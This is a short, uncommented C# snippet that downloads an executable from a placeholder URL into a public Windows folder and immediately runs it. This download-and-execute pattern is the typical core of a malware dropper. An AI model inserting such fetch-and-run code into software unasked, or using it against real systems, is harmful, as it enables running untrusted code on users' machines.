using System.Net;
using System.Diagnostics;

string url = "http://example.com/file.exe";
string path = "C:\\Users\\Public\\file.exe";

WebClient wc = new WebClient();
wc.DownloadFile(url, path);

Process.Start(path);
